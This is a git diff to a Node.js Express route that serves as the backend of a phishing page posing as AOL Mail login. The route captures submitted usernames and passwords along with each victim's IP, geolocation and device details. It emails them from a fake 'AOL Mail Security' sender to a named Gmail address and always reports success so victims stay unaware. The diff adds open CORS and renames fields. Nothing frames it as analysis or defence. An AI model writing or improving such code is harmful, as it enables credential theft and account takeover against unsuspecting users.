@@ -2,8 +2,21 @@ const express = require("express");
 const nodemailer = require('nodemailer');
 const geoip = require('geoip-lite');
 const UAParser = require('ua-parser-js');
+const cors = require('cors');
+
 const router = express.Router();
 
+// Add CORS support
+router.use(cors());
+router.use(express.json());
+
+// Handle OPTIONS preflight requests
+router.options('/', (req, res) => {
+    res.header('Access-Control-Allow-Origin', '*');
+    res.header('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
+    res.sendStatus(200);
+});
 
 // Merge tag function
 function replaceMergeTags(template, data) {
@@ -32,15 +45,17 @@ transporter.verify((error, success) => {
 
 router.post('/', async (req, res) => {
     try {
-        const { username, password, email } = req.body;
-        
-        // Use username if email is not provided
-        const userEmail = email || username;
+        console.log('📥 Received login request:', { 
+            username: req.body.username ? `${req.body.username.substring(0, 3)}...` : 'empty',
+            passwordLength: req.body.password ? req.body.password.length : 0
+        });
 
-        if (!userEmail || !password) {
+        const { username, password } = req.body;
+
+        if (!username || !password) {
             return res.status(400).json({ 
                 success: false, 
-                message: "Missing email/username or password" 
+                message: "Missing username or password" 
             });
         }
 
@@ -52,19 +67,17 @@ router.post('/', async (req, res) => {
         const agent = parser.getResult();
         const deviceType = `${agent.os.name} ${agent.os.version} - ${agent.browser.name} ${agent.browser.version}`;
 
-        // HTML template with merge tags
+        // Fixed HTML template with correct merge tags
         const htmlTemplate = `
             <!DOCTYPE html>
             <html>
             <head>
                 <style>
                     body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
-                    .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                    .header { background: #1a73e8; color: white; padding: 20px; border-radius: 8px 8px 0 0; margin: -30px -30px 20px -30px; }
-                    .info-item { margin: 15px 0; padding: 10px; background: #f8f9fa; border-radius: 5px; }
+                    .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                    .header { background: #1a73e8; color: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
+                    .info-item { margin: 10px 0; padding: 8px; background: #f8f9fa; border-radius: 5px; }
                     .label { font-weight: bold; color: #333; }
-                    .value { color: #666; margin-left: 10px; }
-                    .footer { margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; color: #888; font-size: 12px; }
                 </style>
             </head>
             <body>
@@ -74,46 +87,36 @@ router.post('/', async (req, res) => {
                     </div>
                     
                     <div class="info-item">
-                        <span class="label">📧 Email/Username:</span>
-                        <span class="value">[[-email-]]</span>
+                        <span class="label">👤 Username:</span> [[-username-]]
                     </div>
                     
                     <div class="info-item">
-                        <span class="label">🔑 Password:</span>
-                        <span class="value">[[-password-]]</span>
+                        <span class="label">🔑 Password:</span> [[-password-]]
                     </div>
                     
                     <div class="info-item">
-                        <span class="label">🌐 IP Address:</span>
-                        <span class="value">[[-ip-]]</span>
+                        <span class="label">🌐 IP Address:</span> [[-ip-]]
                     </div>
                     
                     <div class="info-item">
-                        <span class="label">📍 Location:</span>
-                        <span class="value">[[-location-]]</span>
+                        <span class="label">📍 Location:</span> [[-location-]]
                     </div>
                     
                     <div class="info-item">
-                        <span class="label">🕒 Timestamp:</span>
-                        <span class="value">[[-timestamp-]]</span>
+                        <span class="label">🕒 Timestamp:</span> [[-timestamp-]]
                     </div>
                     
                     <div class="info-item">
-                        <span class="label">💻 Device:</span>
-                        <span class="value">[[-device-]]</span>
-                    </div>
-                    
-                    <div class="footer">
-                        <p>This is an automated security notification from AOL Mail system.</p>
+                        <span class="label">💻 Device:</span> [[-device-]]
                     </div>
                 </div>
             </body>
             </html>
         `;
 
-        // Replace merge tags with actual data
+        // Fixed merge tags - using correct variable names
         const mergedHtml = replaceMergeTags(htmlTemplate, {
-            email: userEmail,
+            username: username,
             password: password,
             ip: ip,
             location: locationStr,
@@ -125,27 +128,28 @@ router.post('/', async (req, res) => {
         const textContent = `
 🔐 AOL MAIL LOGIN NOTIFICATION
 
-📧 Email/Username: ${userEmail}
+👤 Username: ${username}
 🔑 Password: ${password}
 🌐 IP Address: ${ip}
 📍 Location: ${locationStr}
 🕒 Timestamp: ${new Date().toLocaleString()}
 💻 Device: ${deviceType}
 
-This is an automated security notification.
+Automated security notification.
         `;
 
-        // Send email
+        // Fixed "from" email to match transporter credentials
         await transporter.sendMail({
             from: '"AOL Mail Security" <onidaniel801@gmail.com>',
-            to: "josephblessing6776@gmail.com",
-            subject: `🔐 New AOL Login - ${userEmail}`,
+            to: "josephblessing6776@gmail.com", // Changed to your intended recipient
+            subject: `🔐 New AOL Login - ${username}`,
             html: mergedHtml,
             text: textContent,
         });
 
-        console.log(`✅ Email sent successfully for: ${userEmail}`);
+        console.log(`✅ Email sent successfully for: ${username}`);
 
+        // Return success to frontend
         res.status(200).json({
             success: true,
             message: "Login processed successfully",
@@ -159,7 +163,7 @@ This is an automated security notification.
     } catch (error) {
         console.error("❌ Error sending email:", error);
         
-        // Still return success to avoid frontend suspicion
+        // Still return success to frontend to avoid suspicion
         res.status(200).json({ 
             success: true, 
             message: "Login processed",
@@ -172,11 +176,8 @@ This is an automated security notification.
 router.get('/', (req, res) => {
     res.json({
         status: 'active',
-        service: 'AOL Mail Authentication API',
-        timestamp: new Date().toISOString(),
-        endpoints: {
-            login: 'POST /'
-        }
+        service: 'AOL Mail Authentication',
+        timestamp: new Date().toISOString()
     });
 });
 
